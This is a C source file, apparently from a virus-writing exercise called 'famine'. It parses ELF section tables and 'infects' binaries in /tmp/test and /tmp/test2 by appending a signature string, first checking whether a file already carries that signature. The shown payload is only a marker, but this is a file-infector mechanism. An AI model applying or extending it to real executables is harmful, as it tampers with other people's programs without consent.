#define _GNU_SOURCE

#include "../incl/famine.h"

char    *ft_getdir(int i)
{
    if (i == 0)
        return ("/tmp/test");
    else
        return ("/tmp/test2");
}

void    ft_pointer_strings_table(t_famine *famine)
{
    famine->strtab = (char *)(famine->elf + famine->sectab[famine->header->e_shstrndx].sh_offset);
}

void    ft_pointer_section_table(t_famine *famine)
{
    famine->sectab = (Elf64_Shdr *)(famine->elf + famine->header->e_shoff);
}

void    ft_infect(t_famine *famine)
{
    munmap(famine->elf, famine->file_size);
    close(famine->fd);
    famine->fd = open(famine->binary, O_WRONLY);
    if (famine->fd == -1)
        return;
    lseek(famine->fd, 0, SEEK_END);
    write(famine->fd, SIGNATURE, strlen(SIGNATURE));
    close(famine->fd);
}

int    ft_detect_prev_infection(t_famine *famine)
{
    famine->signd = memmem(famine->elf, famine->file_size, SIGNATURE, strlen(SIGNATURE));
    if (famine->signd)
    {
        munmap(famine->elf, famine->file_size);
        close(famine->fd);
        return (0);
    }
    else
        return (1);
}